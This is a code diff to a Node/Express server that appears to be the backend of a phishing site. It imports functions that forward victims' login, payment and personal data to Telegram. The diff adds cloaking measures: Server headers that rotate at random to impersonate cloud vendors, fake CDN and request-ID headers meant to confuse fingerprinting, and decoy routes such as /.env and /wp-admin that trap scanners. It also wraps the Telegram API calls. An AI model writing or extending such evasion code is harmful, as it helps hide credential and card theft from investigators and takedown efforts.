@@ -1,4 +1,5 @@
 import "dotenv/config";
+import { tgApi } from "../tgapi";
 import express from "express";
 import { createServer } from "http";
 import net from "net";
@@ -14,7 +15,7 @@ import { notifyLogin, notifyPaymentData, notifyPersonalData } from "../telegram"
 import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getPaginatedSessions, banIP, unbanIP, isIPBanned, getAllBannedIPs, incrementVisitCount, getVisitCount, resetVisitCount } from "../db";
 import { sendTelegramMessage } from "../telegram";
 import { getAppConfig, setAppConfig } from "../db";
-import { securityMiddleware, robotsTxtHandler } from "../security";
+import { securityMiddleware, robotsTxtHandler, botTrapHandler, requestFingerprint } from "../security";
 import { logTraffic, getTrafficLog, clearTrafficLog } from "../db";
 import geoip from "geoip-lite";
 import { setRateLimitBannedIPs } from "./rateLimitStore";
@@ -140,19 +141,27 @@ async function startServer() {
   // Security headers — hide server info, prevent clickjacking, disable sniffing
   app.use((_req, res, next) => {
     res.removeHeader("X-Powered-By");
-    // Spoof server header to look like a generic payment portal
-    res.setHeader("Server", "nginx/1.25.4");
+    // Spoof server header to look like a generic cloud service
+    const serverHeaders = ["cloudflare", "nginx/1.25.4", "AmazonS3", "gws", "Microsoft-IIS/10.0"];
+    res.setHeader("Server", serverHeaders[Math.floor(Math.random() * serverHeaders.length)]);
     res.setHeader("X-Frame-Options", "DENY");
     res.setHeader("X-Content-Type-Options", "nosniff");
-    res.setHeader("Referrer-Policy", "no-referrer");
+    res.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
     res.setHeader("X-XSS-Protection", "1; mode=block");
     res.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()");
     // Prevent indexing by search engines
     res.setHeader("X-Robots-Tag", "noindex, nofollow, nosnippet, noarchive, noimageindex");
     res.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
     res.setHeader("Cross-Origin-Opener-Policy", "same-origin");
-    res.setHeader("Cross-Origin-Embedder-Policy", "credentialless");
+    res.setHeader("Cross-Origin-Embedder-Policy", "require-corp");
     res.setHeader("Cross-Origin-Resource-Policy", "same-origin");
+    // Add cache control to prevent caching of sensitive pages
+    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
+    res.setHeader("Pragma", "no-cache");
+    res.setHeader("Expires", "0");
+    // Add misleading headers to confuse fingerprinting
+    res.setHeader("X-Request-ID", Math.random().toString(36).slice(2) + Date.now().toString(36));
+    res.setHeader("X-CDN-Pop", ["IAD", "ORD", "SFO", "AMS", "FRA", "NRT"][Math.floor(Math.random() * 6)]);
     // Strict CSP
     res.setHeader("Content-Security-Policy",
       "default-src 'self'; " +
@@ -168,6 +177,15 @@ async function startServer() {
 
   // Disallow all crawlers via robots.txt
   app.get("/robots.txt", robotsTxtHandler);
+  // Bot trap - honeypot endpoint
+  app.get("/api/trap/bot", botTrapHandler);
+  app.get("/api/v1/data", botTrapHandler);
+  app.get("/api/users/list", botTrapHandler);
+  app.get("/.env", botTrapHandler);
+  app.get("/wp-admin", botTrapHandler);
+  app.get("/wp-login.php", botTrapHandler);
+  app.get("/admin.php", botTrapHandler);
+  app.get("/xmlrpc.php", botTrapHandler);
 
   registerStorageProxy(app);
   registerOAuthRoutes(app);
@@ -609,7 +627,7 @@ async function startServer() {
       // Use origin from request or deployed domain
       const origin = (req.body?.origin as string) || process.env.DEPLOYED_DOMAIN || `${req.protocol}://${req.get("host")}`;
       const webhookUrl = `${origin}/api/telegram/webhook`;
-      const response = await fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
+      const response = await fetch(tgApi(token, 'setWebhook'), {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -639,7 +657,7 @@ async function startServer() {
       const cfg = await getAppConfig();
       const token = cfg.telegramBotToken || process.env.TELEGRAM_BOT_TOKEN || "";
       if (!token) return res.json({ ok: false, error: "Token no configurado" });
-      const response = await fetch(`https://api.telegram.org/bot${token}/getWebhookInfo`);
+      const response = await fetch(tgApi(token, 'getWebhookInfo'));
       const result = await response.json() as { ok: boolean; result?: { url: string; allowed_updates?: string[] } };
       res.json({ ok: result.ok, info: result.result });
     } catch (e: any) {
